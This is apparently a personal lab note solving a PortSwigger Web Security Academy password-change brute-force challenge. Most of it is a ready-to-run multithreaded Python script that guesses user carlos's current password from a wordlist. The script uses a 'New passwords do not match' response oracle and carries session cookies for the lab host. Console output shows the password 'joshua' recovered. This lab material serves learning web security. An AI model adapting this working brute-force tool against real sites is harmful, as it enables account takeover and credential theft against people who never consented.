
![[Pasted image 20251212002833.png]]

![[Pasted image 20251212002851.png]]

![[Pasted image 20251212003333.png]]

![[Pasted image 20251212003428.png]]


```
import requests, threading, queue, sys, time

from time import perf_counter

  

# --- Configuration & Targets ---

TARGET = "https://0aca002404c3066d80f4a9db006b003b.web-security-academy.net/my-account/change-password"

COOKIE = "session=GKB0LwkN52F0DM8LYQpQISm6FmFkpLnW; session=AYh3BgbHegwjC6yeHss0QIblcNnUYuVG"

  

FORM_DATA_TEMPLATE = {

    "username": "carlos",

    "current-password": "", # This will be filled by the worker threads

    "new-password-1": "password123", # New password to set if successful

    "new-password-2": "pass" # This mismatch is intentional to trigger the 'New passwords do not match' response

}

  

THREADS = 40

TIMEOUT = 10

  

# --- Initialization & State Variables ---

q = queue.Queue()

with open("wordlist.txt") as f:

    for line in f:

        q.put(line.strip())

  

attempted = 0

attempted_lock = threading.Lock()

found = threading.Event()

result_password = [None] # Array used to store the found password

TOTAL = q.qsize()

start_time = perf_counter()

last_print_time = start_time

last_attempted_count = 0

  

# --- Worker Function (The Attacker) ---

def worker():

    global attempted

    # Use a requests Session for efficiency (handles connection pooling)

    s = requests.Session()

    # Set standard HTTP headers

    s.headers.update({

        "Host": "0aca002404c3066d80f4a9db006b003b.web-security-academy.net",

        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",

        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/q=0.8",

        "Accept-Language": "en-US,en;q=0.5",

        "Content-Type": "application/x-www-form-urlencoded",

        "Origin": "https://0aca002404c3066d80f4a9db006b003b.web-security-academy.net",

        "Referer": "https://0aca002404c3066d80f4a9db006b003b.web-security-academy.net/my-account/change-password",

        "Upgrade-Insecure-Requests": "1",

        "Cookie": COOKIE

    })

  

    # Main loop for the worker thread

    while not found.is_set():

        try:

            # Get the next password from the queue without blocking

            password = q.get_nowait()

        except queue.Empty:

            # Queue is empty, worker is done

            return

  

        # Prepare form data

        data = FORM_DATA_TEMPLATE.copy()

        data["current-password"] = password

  

        try:

            # Send the POST request

            r = s.post(TARGET, data=data, timeout=TIMEOUT)

  

            # Check the response for the success/failure indicator

            # The script logic implies that "New passwords do not match"

            # *only* appears if the 'current-password' was correct,

            # but 'new-password-1' and 'new-password-2' were set to be mismatched.

            if "New passwords do not match" in r.text:

                with attempted_lock:

                    result_password[0] = password

                    found.set()

                print(f"\nVALID PASSWORD FOUND: {password}")

                return

  

        except Exception:

            # Handle request exceptions (e.g., timeout, connection error)

            pass

        finally:

            # Increment attempt counter and signal task completion

            with attempted_lock:

                attempted += 1

            q.task_done()

  

# --- Monitor Function (Progress Reporting) ---

def monitor():

    global last_print_time, last_attempted_count

    # Loop until a password is found or queue is empty

    while not found.is_set():

        time.sleep(0.5) # Refresh rate for the display

  

        now = perf_counter()

        with attempted_lock:

            att = attempted

        elapsed = now - start_time

        recent_delta = att - last_attempted_count

        recent_time = now - last_print_time

        # Calculate rates

        rate = att / elapsed if elapsed > 0 else 0

        recent_rate = recent_delta / recent_time if recent_time > 0 else 0

        # Calculate remaining time (ETA)

        remaining = TOTAL - att

        eta = remaining / rate if rate > 0 else float('inf')

        percent = (att / TOTAL) * 100

        # Update last state variables

        last_attempted_count = att

        last_print_time = now

        eta_str = float('inf') if eta == float('inf') else f"{int(eta)}s"

        # Print progress to console

        sys.stdout.write(f"\rTried: {att}/{TOTAL} ({percent:.2f}%) | rate: {rate:.1f}/s | remaining: {remaining} | ETA: {eta_str}")

        sys.stdout.flush()

  

# --- Main Execution Block ---

threads = []

# Start worker threads

for _ in range(THREADS):

    t = threading.Thread(target=worker, daemon=True)

    t.start()

    threads.append(t)

  

# Start monitor thread

m = threading.Thread(target=monitor, daemon=True)

m.start()

  

try:

    # Wait for all worker threads to complete their work

    for t in threads:

        t.join()

    # Wait for the queue to be fully processed

    q.join()

except KeyboardInterrupt:

    # Stop the execution if the user presses Ctrl+C

    found.set()

  

# Final result check and exit

if result_password[0]:

    print(result_password[0])

    sys.exit(0)

else:

    print("\nNO VALID PASSWORD FOUND")

    sys.exit(1)

```

				 ||
				 \/

```

Tried: 41/100 (41.00%) | rate: 19.7/s | remaining: 59 | ETA: 2s
VALID PASSWORD FOUND: joshua
Tried: 61/100 (61.00%) | rate: 23.7/s | remaining: 39 | ETA: 1s

```

![[Pasted image 20251212012131.png]]
